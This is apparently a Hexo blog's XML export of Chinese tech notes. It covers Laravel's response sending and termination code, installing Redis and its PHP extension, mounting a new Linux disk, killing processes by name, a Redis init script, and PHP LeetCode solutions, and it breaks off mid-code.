<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $headers = <span class="keyword">$this</span>-&gt;headers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isInformational() || <span class="keyword">$this</span>-&gt;isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setContent(<span class="keyword">null</span>);</span><br><span class="line">        $headers-&gt;remove(<span class="string">'Content-Type'</span>);</span><br><span class="line">        $headers-&gt;remove(<span class="string">'Content-Length'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Content-type based on the Request</span></span><br><span class="line">        <span class="keyword">if</span> (!$headers-&gt;has(<span class="string">'Content-Type'</span>)) &#123;</span><br><span class="line">            $format = $request-&gt;getRequestFormat();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> !== $format &amp;&amp; $mimeType = $request-&gt;getMimeType($format)) &#123;</span><br><span class="line">                $headers-&gt;set(<span class="string">'Content-Type'</span>, $mimeType);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fix Content-Type</span></span><br><span class="line">        $charset = <span class="keyword">$this</span>-&gt;charset ?: <span class="string">'UTF-8'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!$headers-&gt;has(<span class="string">'Content-Type'</span>)) &#123;</span><br><span class="line">            $headers-&gt;set(<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset='</span>.$charset);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="number">0</span> === stripos($headers-&gt;get(<span class="string">'Content-Type'</span>), <span class="string">'text/'</span>) &amp;&amp; <span class="keyword">false</span> === stripos($headers-&gt;get(<span class="string">'Content-Type'</span>), <span class="string">'charset'</span>)) &#123;</span><br><span class="line">            <span class="comment">// add the charset</span></span><br><span class="line">            $headers-&gt;set(<span class="string">'Content-Type'</span>, $headers-&gt;get(<span class="string">'Content-Type'</span>).<span class="string">'; charset='</span>.$charset);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fix Content-Length</span></span><br><span class="line">        <span class="keyword">if</span> ($headers-&gt;has(<span class="string">'Transfer-Encoding'</span>)) &#123;</span><br><span class="line">            $headers-&gt;remove(<span class="string">'Content-Length'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;isMethod(<span class="string">'HEAD'</span>)) &#123;</span><br><span class="line">            <span class="comment">// cf. RFC2616 14.13</span></span><br><span class="line">            $length = $headers-&gt;get(<span class="string">'Content-Length'</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setContent(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> ($length) &#123;</span><br><span class="line">                $headers-&gt;set(<span class="string">'Content-Length'</span>, $length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fix protocol</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'HTTP/1.0'</span> != $request-&gt;server-&gt;get(<span class="string">'SERVER_PROTOCOL'</span>)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setProtocolVersion(<span class="string">'1.1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if we need to send extra expire info headers</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'1.0'</span> == <span class="keyword">$this</span>-&gt;getProtocolVersion() &amp;&amp; <span class="keyword">false</span> !== strpos(<span class="keyword">$this</span>-&gt;headers-&gt;get(<span class="string">'Cache-Control'</span>), <span class="string">'no-cache'</span>)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers-&gt;set(<span class="string">'pragma'</span>, <span class="string">'no-cache'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers-&gt;set(<span class="string">'expires'</span>, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;ensureIEOverSSLCompatibility($request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-响应发送和程序终止"><a href="#4-响应发送和程序终止" class="headerlink" title="4. 响应发送和程序终止"></a>4. 响应发送和程序终止</h2><h3 id="4-1-响应的发送"><a href="#4-1-响应的发送" class="headerlink" title="4.1 响应的发送"></a>4.1 响应的发送</h3><p>在 <code>index.php</code> 入口文件的最后是将响应返回给客户端</p>
<blockquote>
<p>$response-&gt;send();</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Symfony\Component\HttpFoundation\Response</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sendHeaders();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sendContent();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (function_exists(<span class="string">'fastcgi_finish_request'</span>)) &#123;</span><br><span class="line">        fastcgi_finish_request();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!\in_array(PHP_SAPI, <span class="keyword">array</span>(<span class="string">'cli'</span>, <span class="string">'phpdbg'</span>), <span class="keyword">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">static</span>::closeOutputBuffers(<span class="number">0</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendHeaders</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// headers have already been sent by the developer</span></span><br><span class="line">    <span class="keyword">if</span> (headers_sent()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// headers</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;headers-&gt;allPreserveCase() <span class="keyword">as</span> $name =&gt; $values) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($values <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            header($name.<span class="string">': '</span>.$value, <span class="keyword">false</span>, <span class="keyword">$this</span>-&gt;statusCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// status</span></span><br><span class="line">    header(sprintf(<span class="string">'HTTP/%s %s %s'</span>, <span class="keyword">$this</span>-&gt;version, <span class="keyword">$this</span>-&gt;statusCode, <span class="keyword">$this</span>-&gt;statusText), <span class="keyword">true</span>, <span class="keyword">$this</span>-&gt;statusCode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendContent</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-请求中止"><a href="#4-2-请求中止" class="headerlink" title="4.2 请求中止"></a>4.2 请求中止</h3><p>在 <code>index.php</code> 入口文件的最后:</p>
<blockquote>
<p>\$kernel-&gt;terminate( \$request, \$response );</p>
</blockquote>
<p>依旧以 Http Kernel 为例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">terminate</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;terminateMiddleware($request, $response);	<span class="comment"># 中间件中止处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;terminate();	<span class="comment"># 服务容器的中止处理函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">terminateMiddleware</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $middlewares = <span class="keyword">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : array_merge(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;gatherRouteMiddleware($request),</span><br><span class="line">        <span class="keyword">$this</span>-&gt;middleware</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($middlewares <span class="keyword">as</span> $middleware) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_string($middleware)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>($name) = <span class="keyword">$this</span>-&gt;parseMiddleware($middleware);</span><br><span class="line"></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;make($name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method_exists($instance, <span class="string">'terminate'</span>)) &#123;</span><br><span class="line">            $instance-&gt;terminate($request, $response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处的中间件指的是定义在 Kernel 中的 <code>$middleware</code> 中间件数组列表, 不包含 路由中间件.</p>
<blockquote>
<p>Laravel 5.1 注: 默认只有会话中间件包含 terminate() 函数</p>
</blockquote>
<p><code>Application</code> 服务容器的中止处理函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">terminate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;terminatingCallbacks <span class="keyword">as</span> $terminating) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call($terminating);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装redis及Php扩展</title>
    <url>/articles/Linux%E5%AE%89%E8%A3%85redis%E5%8F%8APhp%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<h3 id="一-安装redis"><a href="#一-安装redis" class="headerlink" title="一 安装redis"></a>一 安装redis</h3><h4 id="1-下载redis包：wget-http-download-redis-io-releases-redis-2-8-9-tar-gz"><a href="#1-下载redis包：wget-http-download-redis-io-releases-redis-2-8-9-tar-gz" class="headerlink" title="1. 下载redis包：wget http://download.redis.io/releases/redis-2.8.9.tar.gz"></a>1. 下载redis包：<code>wget http://download.redis.io/releases/redis-2.8.9.tar.gz</code></h4><h4 id="2-解压redis包后，进入redis-2-8-9目录中，进行编译"><a href="#2-解压redis包后，进入redis-2-8-9目录中，进行编译" class="headerlink" title="2. 解压redis包后，进入redis-2.8.9目录中，进行编译"></a>2. 解压redis包后，进入redis-2.8.9目录中，进行编译</h4><p>先 <code>make</code></p>
<p>然后 <code>make  install</code></p>
<p>测试一下 <code>make test</code></p>
<p>最后运行redis服务端 <code>/usr/local/bin/redis-server</code>        (服务端redis-cli)</p>
<h4 id="3-到此为止，就算安装完成了redis了"><a href="#3-到此为止，就算安装完成了redis了" class="headerlink" title="3. 到此为止，就算安装完成了redis了"></a>3. 到此为止，就算安装完成了redis了</h4><blockquote>
<p>Q: 此时报错：Fatal error: Class ‘Redis’ not found in xxx.php on line 9.<br>A: 因为没有安装php的redis扩展，所有php无法直接操作redis</p>
</blockquote>
<h3 id="二-现在是安装php的redis的扩展"><a href="#二-现在是安装php的redis的扩展" class="headerlink" title="二 现在是安装php的redis的扩展"></a>二 现在是安装php的redis的扩展</h3><h4 id="1，下载地址：-http-pecl-php-net-package-redis"><a href="#1，下载地址：-http-pecl-php-net-package-redis" class="headerlink" title="1，下载地址： http://pecl.php.net/package/redis"></a>1，下载地址： <a href="http://pecl.php.net/package/redis" target="_blank" rel="noopener">http://pecl.php.net/package/redis</a></h4><h4 id="2-选择需要的版本"><a href="#2-选择需要的版本" class="headerlink" title="2. 选择需要的版本:"></a>2. 选择需要的版本:</h4><blockquote>
<p>Available ReleasesVersionStateRelease DateDownloads</p>
</blockquote>
<p>需要注意两个字段</p>
<p>系统架构： Architecture    x86  <code>x86</code></p>
<p>Zend版本：Zend Extension Build    API320151012,TS,VC14  <code>TS VC14</code></p>
<h4 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#加压文件到当前目录</span><br><span class="line">tar  -zxvf  redis-2.2.8.tgz</span><br><span class="line"></span><br><span class="line">#进入解压后的文件目录</span><br><span class="line">cd  redis-2.2.8</span><br><span class="line"></span><br><span class="line">#用phpize生成configure</span><br><span class="line">/usr/local/php/bin/phpize </span><br><span class="line"></span><br><span class="line">#编译配置</span><br><span class="line">./configure --with-php-config=/usr/local/php/bin/php-config</span><br><span class="line"></span><br><span class="line">#编译</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">#安装</span><br><span class="line">make  install</span><br></pre></td></tr></table></figure>

<h4 id="4，配置php-ini文件，使得php可以支持redis扩展"><a href="#4，配置php-ini文件，使得php可以支持redis扩展" class="headerlink" title="4，配置php.ini文件，使得php可以支持redis扩展"></a>4，配置php.ini文件，使得php可以支持redis扩展</h4><p>编辑  /etc/php.ini 添加:  <code>extension=redis.so</code></p>
<p>重启服务；</p>
<p>测试下 <code>php -i|grep redis</code>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis</span><br><span class="line">Registered save handlers =&gt; files user redis rediscluster redis rediscluster</span><br></pre></td></tr></table></figure>

<p>到此Redis扩展安装完成</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Linux删除svn保存的密码和用户名</title>
    <url>/articles/Linux%E5%88%A0%E9%99%A4svn%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81%E5%92%8C%E7%94%A8%E6%88%B7%E5%90%8D/</url>
    <content><![CDATA[<p>~/.subversion/auth/svn.simple/1233……</p>
<p>把相关的username 下你自己的用户名和passwd下你自己的密码删掉，下次再对svn操作时就会让你重新输用户名和密码了。</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Linux挂载新的硬盘</title>
    <url>/articles/Linux%E6%8C%82%E8%BD%BD%E6%96%B0%E7%9A%84%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<h4 id="文字版"><a href="#文字版" class="headerlink" title="文字版"></a>文字版</h4><ol>
<li><p><code>fdisk -l</code>  //先查询未挂载的硬盘名如：sdb1 等</p>
</li>
<li><p><code>mkfs.ext3 /dev/xvdb(新的盘)</code>   // 开始格式化</p>
</li>
<li><p><code>df -h</code> // 查看挂载情况</p>
</li>
<li><p><code>mount /dev/xvdb /home</code> // (/home挂载的地方， 最好是根路径下建一个空的文件夹)   开始挂载</p>
</li>
<li><p><code>vi /etc/fstab</code>       // 设置自动开启启动</p>
<p>格式： <code>/dev/xvdb  /home        ext3    defaults        0 0</code> // 硬盘名      需要挂载的位置   格式</p>
</li>
<li><p>卸载挂载点： <code>umount /home/ftp2</code></p>
</li>
</ol>
<p>另：如果执行fdisk -l 报错，往下看↓</p>
<p>发现有问题：</p>
<blockquote>
<p>Disk /dev/sdb doesn’t contain a valid partition table</p>
</blockquote>
<p><code>fdisk /dev/sdb</code> 跟着向导一步步做下去（如果不知道该输入什么，就输入“m”并回车，可以打印出菜单）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Command (m for help): m</span><br><span class="line"></span><br><span class="line">Command action</span><br><span class="line"></span><br><span class="line">a   toggle a bootable flag</span><br><span class="line"></span><br><span class="line">b   edit bsd disklabel</span><br><span class="line"></span><br><span class="line">c   toggle the dos compatibility flag</span><br><span class="line"></span><br><span class="line">d   delete a partition</span><br><span class="line"></span><br><span class="line">l   list known partition types</span><br><span class="line"></span><br><span class="line">m   print this menu</span><br><span class="line"></span><br><span class="line">n   add a new partition</span><br><span class="line"></span><br><span class="line">（后面的菜单省略，太长了）</span><br></pre></td></tr></table></figure>

<p>这里我们要添加一个新的分区，所以输入“n”：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Command (m for help): n</span><br><span class="line"></span><br><span class="line">Command action</span><br><span class="line"></span><br><span class="line">e   extended</span><br><span class="line"></span><br><span class="line">p   primary partition (1-4)</span><br><span class="line"></span><br><span class="line">p</span><br><span class="line"></span><br><span class="line">Partition number (1-4): 1</span><br><span class="line"></span><br><span class="line">First cylinder (1-14098, default 1): （此处直接回车）</span><br><span class="line"></span><br><span class="line">Using default value 1</span><br><span class="line"></span><br><span class="line">Last cylinder or +size or +sizeM or +sizeK (1-14098, default 14098): （此处直接回车）</span><br><span class="line"></span><br><span class="line">Using default value 14098</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 115.9 GB, 115964116992 bytes</span><br><span class="line"></span><br><span class="line">255 heads, 63 sectors/track, 14098 cylinders</span><br><span class="line"></span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line"></span><br><span class="line">Device Boot      Start         End      Blocks   Id  System</span><br><span class="line"></span><br><span class="line">/dev/sdb1               1       14098   113242153+  83  Linux</span><br></pre></td></tr></table></figure>

<p>现在可以写入分区表了，所以输入“w”：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Command (m for help): w</span><br><span class="line"></span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line"></span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure>

<p>现在再fdisk -l，结果正常</p>
<p>– 如果到这里挂载完成，以下内容可不看 –</p>
<h4 id="图文版"><a href="#图文版" class="headerlink" title="图文版"></a>图文版</h4><h5 id="查看新硬盘"><a href="#查看新硬盘" class="headerlink" title="查看新硬盘"></a>查看新硬盘</h5><p><code>fdisk -l</code></p>
<p><img src="/articles/Linux挂载新的硬盘/1.jpg" alt></p>
<p>新添加的硬盘的编号为/dev/sdb</p>
<h5 id="硬盘分区"><a href="#硬盘分区" class="headerlink" title="硬盘分区"></a>硬盘分区</h5><ul>
<li>进入fdisk模式</li>
</ul>
<p><code>fdisk /dev/sdb</code></p>
<p><img src="/articles/Linux挂载新的硬盘/2.jpg" alt></p>
<ul>
<li><p>输入n进行分区</p>
</li>
<li><p>选择分区类型</p>
</li>
</ul>
<p><img src="/articles/Linux挂载新的硬盘/3.jpg" alt></p>
<p>这里有两个选项：</p>
<p>p: 主分区 linux上主分区最多能有4个</p>
<p>e: 扩展分区 linux上扩展分区只能有1个，扩展分区创建后不能直接使用，还要在扩展分区上创建逻辑分区。</p>
<p>这里选择的p。</p>
<ul>
<li>选择分区个数</li>
</ul>
<p>只分1个分区 直接输入1 接下来设置柱面，默认即可</p>
<p><img src="/articles/Linux挂载新的硬盘/4.jpg" alt></p>
<ul>
<li>写入分区表 输入w，分区结束</li>
</ul>
<p><img src="/articles/Linux挂载新的硬盘/5.jpg" alt></p>
<ul>
<li>分区结束后，查看/dev目录</li>
</ul>
<p><code>ls -l /dev</code></p>
<p><img src="/articles/Linux挂载新的硬盘/6.jpg" alt></p>
<p>可以看到刚刚生成的新分区sdb1</p>
<h5 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h5><p>将新分区格式化为ext3文件系统</p>
<p><code>mkfs -t ext3 /dev/sdb1</code></p>
<p><img src="/articles/Linux挂载新的硬盘/7.jpg" alt></p>
<p>最后写入文件系统信息。</p>
<p>此时就可以用新创建的分区了</p>
<h5 id="挂载硬盘"><a href="#挂载硬盘" class="headerlink" title="挂载硬盘"></a>挂载硬盘</h5><ul>
<li>创建挂载点</li>
</ul>
<p>在根目录下创建storage目录</p>
<p><code>mkdir /storage</code></p>
<ul>
<li>将/dev/sdb1挂载到/storage下</li>
</ul>
<p><code>mount /dev/sdb1 /storage</code></p>
<h5 id="设置开机启动自动挂载"><a href="#设置开机启动自动挂载" class="headerlink" title="设置开机启动自动挂载"></a>设置开机启动自动挂载</h5><p>新创建的分区不能开机自动挂载，每次重启机器都要手动挂载。</p>
<p>设置开机自动挂载需要修改/etc/fstab文件</p>
<p><code>vi /etc/fstab</code></p>
<p>在文件的最后增加一行</p>
<p><code>/dev/sdb1 /storage ext3 defaults 1 2</code></p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Linux下批量杀掉筛选进程</title>
    <url>/articles/Linux%E4%B8%8B%E6%89%B9%E9%87%8F%E6%9D%80%E6%8E%89%E7%AD%9B%E9%80%89%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<p>由于情况要求，需要只杀掉某一类含有特定参数命令的进程。</p>
<p>具体命令参考：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep test | grep -v grep | awk '&#123;print $2&#125;' | xargs kill -9</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<p><code>|</code> 管道符，用来隔开两个命令，管道符左边命令的输出会作为管道符右边命令的输入。</p>
<p><code>ps</code> 命令用来列出系统中当前运行的进程， ps -ef显示所有进程信息，联通命令行。</p>
<p><code>grep</code> 命令用于过滤/搜索特定字符，grep test在这里为搜索过滤所有含有‘test’名称的进程</p>
<p><code>grep -v grep</code>  显示不包含匹配文本的所有行，在这里为筛选出所有不包含grep名称的进程，对上一步的进程再做一次筛选(因为ps -ef列出了所有的命令，包括命令行)</p>
<p><code>awk</code> 在文件或字符串中基于指定规则浏览和抽取信息；把文件逐行读入，以空格为默认分隔符将每行切片，然后再进行后序处理。这里利用awk ‘{print $2}’将上一步中过滤得到的进程进行打印，$2表示打印第二个域(PID，进程号) $0表示所有域,$1表示第一个域，$n表示第n个域。</p>
<p><code>xargs</code>  命令是给命令传递参数的过滤器，善于把标准数据数据转换成命令行参数。在这里则是将获取前一个命令的标准输出然后转换成命令行参数传递给后面的kill命令。</p>
<p><code>kill -9</code> 强制关闭进程。</p>
<p>此外，也有使用cut命令进行处理的，参考如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep test | grep -v grep | cut -c 9-15 | xargs kill -9</span><br></pre></td></tr></table></figure>

<p>cut -c 9-15  仅显示第9-15个字符(即PID，进程号)</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Linux下安装配置redis 自启动脚本</title>
    <url>/articles/Linux%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEredis%20%E8%87%AA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chkconfig:2345 80 90</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Simple Redis init.d script conceived to work on Linux systems</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> as it does use of the /proc filesystem.</span></span><br><span class="line">REDISPORT=6379</span><br><span class="line">EXEC=/usr/local/bin/redis-server</span><br><span class="line">CLIEXEC=/usr/local/bin/redis-cli</span><br><span class="line">PIDFILE=/var/run/redis_$&#123;REDISPORT&#125;.pid</span><br><span class="line">CONF="/etc/redis.conf"</span><br><span class="line">case "$1" in</span><br><span class="line">    start)</span><br><span class="line">        if [ -f $PIDFILE ]</span><br><span class="line">        then</span><br><span class="line">                echo "$PIDFILE exists, process is already running or crashed"</span><br><span class="line">        else</span><br><span class="line">                echo "Starting Redis server..."</span><br><span class="line">                $EXEC $CONF &amp;</span><br><span class="line">        fi</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        if [ ! -f $PIDFILE ]</span><br><span class="line">        then</span><br><span class="line">                echo "$PIDFILE does not exist, process is not running"</span><br><span class="line">        else</span><br><span class="line">                PID=$(cat $PIDFILE)</span><br><span class="line">                echo "Stopping ..."</span><br><span class="line">                $CLIEXEC -p $REDISPORT shutdown</span><br><span class="line">                while [ -x /proc/$&#123;PID&#125; ]</span><br><span class="line">                do</span><br><span class="line">                    echo "Waiting for Redis to shutdown ..."</span><br><span class="line">                    sleep 1</span><br><span class="line">                done</span><br><span class="line">                echo "Redis stopped"</span><br><span class="line">        fi</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        echo "Please use start or stop as first argument"</span><br><span class="line">        ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode练习</title>
    <url>/articles/LeetCode%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>本文记录LeetCode练习。</p>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h4 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a><a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">两数之和</a></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer[] $nums</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Integer[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">twoSum</span><span class="params">($nums, $target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($nums))&#123; </span><br><span class="line">            <span class="keyword">foreach</span>($nums <span class="keyword">as</span> $k1=&gt;$v)&#123;</span><br><span class="line">                $offset = $target-$v;</span><br><span class="line">                $k2 = array_search($offset,$nums);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">false</span> !== $k2 &amp;&amp; $k1!=$k2)&#123;</span><br><span class="line">                    <span class="keyword">return</span> [$k1,$k2];</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a><a href="https://leetcode-cn.com/problems/add-two-numbers/" target="_blank" rel="noopener">两数相加</a></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a singly-linked list.</span></span><br><span class="line"><span class="comment"> * class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     public $val = 0;</span></span><br><span class="line"><span class="comment"> *     public $next = null;</span></span><br><span class="line"><span class="comment"> *     function __construct($val) &#123; $this-&gt;val = $val; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ListNode $l1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ListNode $l2</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ListNode</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addTwoNumbers</span><span class="params">($l1, $l2)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        $node = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        $out = <span class="number">0</span>;<span class="comment">// 上一次进位</span></span><br><span class="line">        </span><br><span class="line">        $header = $node;<span class="comment">// 头结点</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>($l1 || $l2)&#123;</span><br><span class="line">            </span><br><span class="line">            $x  = $l1-&gt;val ?? <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            $y  = $l2-&gt;val ?? <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            $sum  = $x + $y + $out;</span><br><span class="line">            </span><br><span class="line">            $val = intval($sum % <span class="number">10</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 下一次进位</span></span><br><span class="line">            $out = intval($sum / <span class="number">10</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 构建下一个结点</span></span><br><span class="line">            $node-&gt;next = <span class="keyword">new</span> ListNode($val); </span><br><span class="line">                           </span><br><span class="line">            <span class="comment">// 